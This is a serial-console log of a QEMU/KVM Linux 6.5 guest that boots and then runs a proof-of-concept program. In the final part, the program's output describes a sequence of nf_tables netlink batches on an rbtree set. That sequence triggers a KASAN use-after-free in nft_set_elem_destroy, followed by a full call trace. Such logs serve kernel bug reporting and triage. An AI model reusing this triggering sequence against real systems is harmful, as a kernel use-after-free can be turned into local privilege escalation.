bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+BEFCEF00+BEF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM...
c[?7l[2JNo EFI environment detected.
early console in extract_kernel
input_data: 0x0000000004db93a8
input_len: 0x0000000001a117e1
output: 0x0000000001000000
output_len: 0x0000000005753144
kernel_total_size: 0x0000000005430000
needed_size: 0x0000000005800000
trampoline_32bit: 0x000000000009d000


KASLR disabled: 'nokaslr' on cmdline.


Decompressing Linux... Parsing ELF... No relocation needed... done.
Booting the kernel (entry_offset: 0x0000000000000000).
[    0.000000] Linux version 6.5.0-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Fri May  8 07:21:21 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x00000000bffdffff] usable
[    0.000000] BIOS-e820: [mem 0x00000000bffe0000-0x00000000bfffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000100000000-0x000000013fffffff] usable
[    0.000000] printk: bootconsole [earlyser0] enabled
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000002] kvm-clock: using sched offset of 516447359 cycles
[    0.003592] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.009003] tsc: Detected 2995.200 MHz processor
[    0.010630] last_pfn = 0x140000 max_arch_pfn = 0x400000000
[    0.011974] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.013969] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.017840] last_pfn = 0xbffe0 max_arch_pfn = 0x400000000
[    0.025374] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.026947] Using GB pages for direct mapping
[    0.031047] Incomplete global flushes, disabling PCID
[    0.031840] RAMDISK: [mem 0xbfe4f000-0xbffdffff]
[    0.034247] ACPI: Early table checksum verification disabled
[    0.035745] ACPI: RSDP 0x00000000000F59B0 000014 (v00 BOCHS )
[    0.037353] ACPI: RSDT 0x00000000BFFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.039646] ACPI: FACP 0x00000000BFFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.042051] ACPI: DSDT 0x00000000BFFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.043751] ACPI: FACS 0x00000000BFFE0000 000040
[    0.044643] ACPI: APIC 0x00000000BFFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.046772] ACPI: HPET 0x00000000BFFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.048914] ACPI: WAET 0x00000000BFFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.051110] ACPI: Reserving FACP table memory at [mem 0xbffe19df-0xbffe1a52]
[    0.053032] ACPI: Reserving DSDT table memory at [mem 0xbffe0040-0xbffe19de]
[    0.056084] ACPI: Reserving FACS table memory at [mem 0xbffe0000-0xbffe003f]
[    0.058646] ACPI: Reserving APIC table memory at [mem 0xbffe1a53-0xbffe1ad2]
[    0.061681] ACPI: Reserving HPET table memory at [mem 0xbffe1ad3-0xbffe1b0a]
[    0.063562] ACPI: Reserving WAET table memory at [mem 0xbffe1b0b-0xbffe1b32]
[    0.066132] No NUMA configuration found
[    0.067146] Faking a node at [mem 0x0000000000000000-0x000000013fffffff]
[    0.069291] NODE_DATA(0) allocated [mem 0x13fffa000-0x13fffdfff]
[    0.072282] Zone ranges:
[    0.073503]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.075774]   DMA32    [mem 0x0000000001000000-0x00000000ffffffff]
[    0.077852]   Normal   [mem 0x0000000100000000-0x000000013fffffff]
[    0.079893] Movable zone start for each node
[    0.081060] Early memory node ranges
[    0.082106]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.084256]   node   0: [mem 0x0000000000100000-0x00000000bffdffff]
[    0.086254]   node   0: [mem 0x0000000100000000-0x000000013fffffff]
[    0.088148] Initmem setup node 0 [mem 0x0000000000001000-0x000000013fffffff]
[    0.091213] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.091269] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.124970] On node 0, zone Normal: 32 pages in unavailable ranges
[    0.662109] kasan: KernelAddressSanitizer initialized
[    0.671288] ACPI: PM-Timer IO Port: 0x608
[    0.672145] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.673395] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.674838] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.676181] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.677531] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.680189] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.682500] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.685626] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.688073] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.689278] TSC deadline timer available
[    0.690162] smpboot: Allowing 2 CPUs, 0 hotplug CPUs
[    0.691304] kvm-guest: KVM setup pv remote TLB flush
[    0.692405] kvm-guest: setup PV sched yield
[    0.693333] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.695070] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
[    0.698163] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000effff]
[    0.700231] PM: hibernation: Registered nosave memory: [mem 0x000f0000-0x000fffff]
[    0.704451] PM: hibernation: Registered nosave memory: [mem 0xbffe0000-0xbfffffff]
[    0.708237] PM: hibernation: Registered nosave memory: [mem 0xc0000000-0xfeffbfff]
[    0.709966] PM: hibernation: Registered nosave memory: [mem 0xfeffc000-0xfeffffff]
[    0.711761] PM: hibernation: Registered nosave memory: [mem 0xff000000-0xfffbffff]
[    0.713602] PM: hibernation: Registered nosave memory: [mem 0xfffc0000-0xffffffff]
[    0.715441] [mem 0xc0000000-0xfeffbfff] available for PCI devices
[    0.718907] Booting paravirtualized kernel on KVM
[    0.721767] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.738317] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    0.746210] percpu: Embedded 66 pages/cpu s232168 r8192 d29976 u1048576
[    0.748098] Kernel command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.750095] Unknown kernel command line parameters "nokaslr", will be passed to user space.
[    0.752069] random: crng init done
[    0.757834] Dentry cache hash table entries: 524288 (order: 10, 4194304 bytes, linear)
[    0.763536] Inode-cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.765686] Fallback order for Node 0: 0 
[    0.765698] Built 1 zonelists, mobility grouping on.  Total pages: 1031904
[    0.768082] Policy zone: Normal
[    0.768778] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.770218] stackdepot: allocating hash table via alloc_large_system_hash
[    0.782314] stackdepot hash table entries: 1048576 (order: 11, 8388608 bytes, linear)
[    0.784151] software IO TLB: area num 2.
[    0.922730] Memory: 3423244K/4193784K available (49152K kernel code, 7999K rwdata, 10244K rodata, 5688K init, 2772K bss, 770284K reserved, 0K cma-reserved)
[    0.928634] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
Poking KASLR using RDRAND RDTSC...
[    0.932173] Dynamic Preempt: voluntary
[    0.935709] rcu: Preemptible hierarchical RCU implementation.
[    0.936894] rcu: 	RCU event tracing is enabled.
[    0.937782] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.940808] 	Trampoline variant of Tasks RCU enabled.
[    0.944077] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.947418] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.956729] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.959465] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.969915] Console: colour VGA+ 80x25
[    0.970814] printk: console [ttyS0] enabled
[    0.970814] printk: console [ttyS0] enabled
[    0.972639] printk: bootconsole [earlyser0] disabled
[    0.972639] printk: bootconsole [earlyser0] disabled
[    0.974967] ACPI: Core revision 20230331
[    0.976257] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.979105] APIC: Switch to symmetric I/O mode setup
[    0.980723] kvm-guest: setup PV IPIs
[    0.983701] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.985435] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2b2c8ec87c7, max_idle_ns: 440795278598 ns
[    0.987830] Calibrating delay loop (skipped) preset value.. 5990.40 BogoMIPS (lpj=2995200)
[    0.989302] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.990087] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.990810] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.991831] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.992823] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    0.993810] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    0.994810] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.995809] RETBleed: Mitigation: Enhanced IBRS
[    0.996813] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.997810] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    0.998811] MMIO Stale Data: Unknown: No mitigations
[    0.999849] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    1.000810] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    1.001810] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    1.002811] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    1.003808] x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'compacted' format.
[    1.023383] Freeing SMP alternatives memory: 44K
[    1.023811] pid_max: default: 32768 minimum: 301
[    1.024883] LSM: initializing lsm=capability,selinux,integrity
[    1.025830] SELinux:  Initializing.
[    1.026888] Mount-cache hash table entries: 8192 (order: 4, 65536 bytes, linear)
[    1.027827] Mountpoint-cache hash table entries: 8192 (order: 4, 65536 bytes, linear)
[    1.030994] smpboot: CPU0: 13th Gen Intel(R) Core(TM) i9-13900H (family: 0x6, model: 0xba, stepping: 0x2)
[    1.032042] RCU Tasks: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1.
[    1.032840] Performance Events: unsupported p6 CPU model 186 no PMU driver, software events only.
[    1.033874] signal: max sigframe size: 1776
[    1.034873] rcu: Hierarchical SRCU implementation.
[    1.035816] rcu: 	Max phase no-delay instances is 400.
[    1.037293] smp: Bringing up secondary CPUs ...
[    1.038044] smpboot: x86: Booting SMP configuration:
[    1.038816] .... node  #0, CPUs:      #1
[    1.039916] smp: Brought up 1 node, 2 CPUs
[    1.041807] smpboot: Max logical packages: 1
[    1.041813] smpboot: Total of 2 processors activated (11980.80 BogoMIPS)
[    1.043888] devtmpfs: initialized
[    1.046491] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    1.046819] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    1.048046] PM: RTC time: 07:21:59, date: 2026-05-08
[    1.049006] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    1.050060] audit: initializing netlink subsys (disabled)
[    1.051980] audit: type=2000 audit(1778224919.669:1): state=initialized audit_enabled=0 res=1
[    1.052192] thermal_sys: Registered thermal governor 'step_wise'
[    1.052817] thermal_sys: Registered thermal governor 'user_space'
[    1.053845] cpuidle: using governor menu
[    1.056239] PCI: Using configuration type 1 for base access
[    1.057010] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    1.058973] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    1.059814] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    1.062433] ACPI: Added _OSI(Module Device)
[    1.062815] ACPI: Added _OSI(Processor Device)
[    1.064837] ACPI: Added _OSI(3.0 _SCP Extensions)
[    1.065816] ACPI: Added _OSI(Processor Aggregator Device)
[    1.075358] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    1.132049] ACPI: Interpreter enabled
[    1.132851] ACPI: PM: (supports S0 S3 S4 S5)
[    1.133813] ACPI: Using IOAPIC for interrupt routing
[    1.134851] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    1.137816] PCI: Using E820 reservations for host bridge windows
[    1.140367] ACPI: Enabled 2 GPEs in block 00 to 0F
[    1.160251] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    1.165836] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    1.167816] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    1.170888] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    1.175440] PCI host bridge to bus 0000:00
[    1.177873] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    1.180823] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    1.182820] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    1.184816] pci_bus 0000:00: root bus resource [mem 0xc0000000-0xfebfffff window]
[    1.186814] pci_bus 0000:00: root bus resource [mem 0x140000000-0x1bfffffff window]
[    1.187941] pci_bus 0000:00: root bus resource [bus 00-ff]
[    1.189056] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000
[    1.196601] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100
[    1.204064] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180
[    1.207701] pci 0000:00:01.1: reg 0x20: [io  0xc040-0xc04f]
[    1.209636] pci 0000:00:01.1: legacy IDE quirk: reg 0x10: [io  0x01f0-0x01f7]
[    1.211817] pci 0000:00:01.1: legacy IDE quirk: reg 0x14: [io  0x03f6]
[    1.213829] pci 0000:00:01.1: legacy IDE quirk: reg 0x18: [io  0x0170-0x0177]
[    1.216864] pci 0000:00:01.1: legacy IDE quirk: reg 0x1c: [io  0x0376]
[    1.219451] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000
[    1.220916] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    1.221829] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    1.223425] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000
[    1.227326] pci 0000:00:02.0: reg 0x10: [mem 0xfd000000-0xfdffffff pref]
[    1.230278] pci 0000:00:02.0: reg 0x18: [mem 0xfebf0000-0xfebf0fff]
[    1.235240] pci 0000:00:02.0: reg 0x30: [mem 0xfebe0000-0xfebeffff pref]
[    1.237113] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    1.246488] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000
[    1.249840] pci 0000:00:03.0: reg 0x10: [mem 0xfebc0000-0xfebdffff]
[    1.251794] pci 0000:00:03.0: reg 0x14: [io  0xc000-0xc03f]
[    1.260568] pci 0000:00:03.0: reg 0x30: [mem 0xfeb80000-0xfebbffff pref]
[    1.273025] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    1.275698] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    1.277459] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    1.280357] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    1.281040] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    1.281807] iommu: Default domain type: Translated
[    1.282816] iommu: DMA domain TLB invalidation policy: lazy mode
[    1.285137] SCSI subsystem initialized
[    1.285971] ACPI: bus type USB registered
[    1.286855] usbcore: registered new interface driver usbfs
[    1.287840] usbcore: registered new interface driver hub
[    1.288832] usbcore: registered new device driver usb
[    1.289872] pps_core: LinuxPPS API ver. 1 registered
[    1.290805] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    1.290838] PTP clock support registered
[    1.291912] Advanced Linux Sound Architecture Driver Initialized.
[    1.293476] NetLabel: Initializing
[    1.293815] NetLabel:  domain hash size = 128
[    1.295032] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    1.296160] NetLabel:  unlabeled traffic allowed by default
[    1.297044] PCI: Using ACPI for IRQ routing
[    1.298103] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    1.298807] pci 0000:00:02.0: vgaarb: bridge control possible
[    1.298807] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    1.298817] vgaarb: loaded
[    1.299753] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    1.299831] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    1.303906] clocksource: Switched to clocksource kvm-clock
[    1.351836] VFS: Disk quotas dquot_6.6.0
[    1.353840] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    1.355779] pnp: PnP ACPI init
[    1.358118] pnp: PnP ACPI: found 6 devices
[    1.371796] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    1.373701] NET: Registered PF_INET protocol family
[    1.377261] IP idents hash table entries: 65536 (order: 7, 524288 bytes, linear)
[    1.379784] tcp_listen_portaddr_hash hash table entries: 2048 (order: 3, 32768 bytes, linear)
[    1.382006] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    1.383862] TCP established hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    1.385876] TCP bind hash table entries: 32768 (order: 8, 1048576 bytes, linear)
[    1.390122] TCP: Hash tables configured (established 32768 bind 32768)
[    1.391583] UDP hash table entries: 2048 (order: 4, 65536 bytes, linear)
[    1.393029] UDP-Lite hash table entries: 2048 (order: 4, 65536 bytes, linear)
[    1.394719] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    1.396582] RPC: Registered named UNIX socket transport module.
[    1.398034] RPC: Registered udp transport module.
[    1.399173] RPC: Registered tcp transport module.
[    1.400421] RPC: Registered tcp-with-tls transport module.
[    1.401627] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    1.403750] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    1.405249] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    1.406664] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    1.408459] pci_bus 0000:00: resource 7 [mem 0xc0000000-0xfebfffff window]
[    1.410088] pci_bus 0000:00: resource 8 [mem 0x140000000-0x1bfffffff window]
[    1.411891] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    1.413313] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    1.414909] PCI: CLS 0 bytes, default 64
[    1.415952] PCI-DMA: Using software bounce buffering for IO (SWIOTLB)
[    1.416109] Unpacking initramfs...
[    1.417618] software IO TLB: mapped [mem 0x00000000bbe4f000-0x00000000bfe4f000] (64MB)
[    1.422208] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    1.424179] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2b2c8ec87c7, max_idle_ns: 440795278598 ns
[    1.428302] Initialise system trusted keyrings
[    1.429534] workingset: timestamp_bits=56 max_order=20 bucket_order=0
[    1.433229] NFS: Registering the id_resolver key type
[    1.434552] Key type id_resolver registered
[    1.435650] Key type id_legacy registered
[    1.436748] 9p: Installing v9fs 9p2000 file system support
[    1.444703] Key type asymmetric registered
[    1.445520] Asymmetric key parser 'x509' registered
[    1.445711] Freeing initrd memory: 1604K
[    1.446443] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    1.448905] io scheduler mq-deadline registered
[    1.450118] io scheduler kyber registered
[    1.451461] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    1.453608] ACPI: button: Power Button [PWRF]
[    1.455259] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    1.457092] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    1.459917] Non-volatile memory driver v1.3
[    1.460988] Linux agpgart interface v0.103
[    1.462129] ACPI: bus type drm_connector registered
[    1.475941] loop: module loaded
[    1.479045] scsi host0: ata_piix
[    1.480838] scsi host1: ata_piix
[    1.481812] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14
[    1.483530] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15
[    1.486643] e100: Intel(R) PRO/100 Network Driver
[    1.487794] e100: Copyright(c) 1999-2006 Intel Corporation
[    1.489113] e1000: Intel(R) PRO/1000 Network Driver
[    1.490271] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    1.639519] ata2: found unknown device (class 0)
[    1.641401] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    1.643834] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    1.689100] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    1.690508] cdrom: Uniform CD-ROM driver Revision: 3.20
[    1.705358] sr 1:0:0:0: Attached scsi generic sg0 type 5
[    1.982517] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    2.357281] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    2.360957] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    2.362762] e1000e: Intel(R) PRO/1000 Network Driver
[    2.363913] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    2.365271] sky2: driver version 1.30
[    2.366565] usbcore: registered new interface driver usblp
[    2.368715] usbcore: registered new interface driver usb-storage
[    2.370413] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    2.375562] serio: i8042 KBD port at 0x60,0x64 irq 1
[    2.378177] serio: i8042 AUX port at 0x60,0x64 irq 12
[    2.380209] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    2.382350] rtc_cmos 00:05: RTC can wake from S4
[    2.384901] rtc_cmos 00:05: registered as rtc0
[    2.385983] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    2.387888] device-mapper: ioctl: 4.48.0-ioctl (2023-03-01) initialised: dm-devel@redhat.com
[    2.392514] intel_pstate: CPU model not supported
[    2.394512] hid: raw HID events driver (C) Jiri Kosina
[    2.397692] usbcore: registered new interface driver usbhid
[    2.399888] usbhid: USB HID core driver
[    2.401964] Initializing XFRM netlink socket
[    2.402998] NET: Registered PF_INET6 protocol family
[    2.404806] Segment Routing with IPv6
[    2.407681] In-situ OAM (IOAM) with IPv6
[    2.408643] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    2.410292] NET: Registered PF_PACKET protocol family
[    2.412855] 9pnet: Installing 9P2000 support
[    2.413867] Key type dns_resolver registered
[    2.415520] IPI shorthand broadcast: enabled
[    2.428425] sched_clock: Marking stable (2407034206, 21144698)->(2519417542, -91238638)
[    2.430434] registered taskstats version 1
[    2.431417] Loading compiled-in X.509 certificates
[    2.442447] PM:   Magic number: 10:158:369
[    2.443962] printk: console [netcon0] enabled
[    2.444948] netconsole: network logging started
[    2.446055] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    2.447959] kworker/u4:1 (51) used greatest stack depth: 29536 bytes left
[    2.449912] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    2.451218] ALSA device list:
[    2.452148]   No soundcards found.
[    2.455558] Freeing unused kernel image (initmem) memory: 5688K
[    2.456827] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    2.458749] cfg80211: failed to load regulatory.db
[    2.461296] Write protecting the kernel read-only data: 61440k
[    2.462392] Freeing unused kernel image (rodata/data gap) memory: 2044K
[    2.472938] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    2.473830] Run /init as init process
[    2.477762] mount (55) used greatest stack depth: 28672 bytes left

secb: rootfs ready
---- poc begin ----
[*] batch 1: NEWTABLE t1, NEWOBJ obj1, NEWSET rbset (rbtree TIMEOUT|OBJECT|INTERVAL, key_len=0x40)
    [drain b1] acks=3 errs=0
    [drain b2-0x80] acks=1 errs=0
    [drain b3-0x70] acks=1 errs=0
    [drain b4-0x60] acks=1 errs=0
[    3.030003] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
    [drain b5-0x50] acks=1 errs=0
    [drain b6-0x40-expired] acks=1 errs=0
[*] batches 2..6: 5 NEWSETELEM (each in own committed batch) -- 0x80/0x70/0x60/0x50 @ 60s, 0x40 @ 1ms
[*] TRIGGER batch: NEWSETELEM 0x58 INTERVAL_END | NEWSETELEM 0x48 (gc) | NEWSETELEM nope_set 0x10 (poison)
[    3.356381] ==================================================================
[    3.357369] BUG: KASAN: slab-use-after-free in nft_set_elem_destroy+0x403/0x490
[    3.358345] Read of size 1 at addr ffff888103a50b1b by task poc/61
[    3.359155] 
[    3.359388] CPU: 0 PID: 61 Comm: poc Not tainted 6.5.0-dirty #1
[    3.360147] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    3.361373] Call Trace:
[    3.361721]  <TASK>
[    3.362024]  dump_stack_lvl+0x36/0x50
[    3.362514]  print_report+0xcf/0x660
[    3.363002]  ? nft_set_elem_destroy+0x403/0x490
[    3.364512]  kasan_report+0xc7/0x100
[    3.365700]  ? nft_set_elem_destroy+0x403/0x490
[    3.367018]  nft_set_elem_destroy+0x403/0x490
[    3.367474]  ? __pfx_nft_set_elem_destroy+0x10/0x10
[    3.367973]  ? kasan_save_free_info+0x2b/0x50
[    3.368455]  ? __nf_tables_abort+0x126b/0x4e00
[    3.368944]  __nf_tables_abort+0x1511/0x4e00
[    3.369416]  ? __pfx___nf_tables_abort+0x10/0x10
[    3.369902]  nf_tables_abort+0xb2/0x120
[    3.370331]  nfnetlink_rcv_batch+0x813/0x1fc0
[    3.370869]  ? __pfx_nfnetlink_rcv_batch+0x10/0x10
[    3.371498]  ? _raw_spin_lock_irqsave+0x86/0xe0
[    3.372004]  ? kmalloc_reserve+0xb1/0x1e0
[    3.372553]  ? __alloc_skb+0xd4/0x280
[    3.373057]  ? netlink_sendmsg+0x83a/0xc60
[    3.373525]  ? sock_sendmsg+0x13d/0x180
[    3.373965]  ? __sys_sendto+0x1eb/0x2b0
[    3.374398]  ? avc_has_perm_noaudit+0x8a/0x130
[    3.374914]  nfnetlink_rcv+0x2df/0x360
[    3.375344]  ? __pfx_nfnetlink_rcv+0x10/0x10
[    3.375818]  ? __kmalloc_node_track_caller+0x5a/0x160
[    3.376395]  netlink_unicast+0x588/0x7f0
[    3.376892]  ? __pfx_netlink_unicast+0x10/0x10
[    3.377493]  netlink_sendmsg+0x7b7/0xc60
[    3.378006]  ? __pfx_netlink_sendmsg+0x10/0x10
[    3.378581]  ? __pfx_netlink_sendmsg+0x10/0x10
[    3.379892]  sock_sendmsg+0x13d/0x180
[    3.381164]  __sys_sendto+0x1eb/0x2b0
[    3.381769]  ? __pfx___sys_sendto+0x10/0x10
[    3.382361]  ? _raw_spin_lock_irq+0x81/0xe0
[    3.383016]  ? __rseq_handle_notify_resume+0x7ce/0xc20
[    3.383900]  ? __pfx__raw_spin_lock_irq+0x10/0x10
[    3.384667]  ? ksys_write+0xf9/0x1d0
[    3.385159]  __x64_sys_sendto+0xdb/0x1b0
[    3.385727]  ? exit_to_user_mode_prepare+0x2a/0x110
[    3.386760]  ? syscall_exit_to_user_mode+0x2f/0x50
[    3.387565]  do_syscall_64+0x3b/0x90
[    3.388003]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
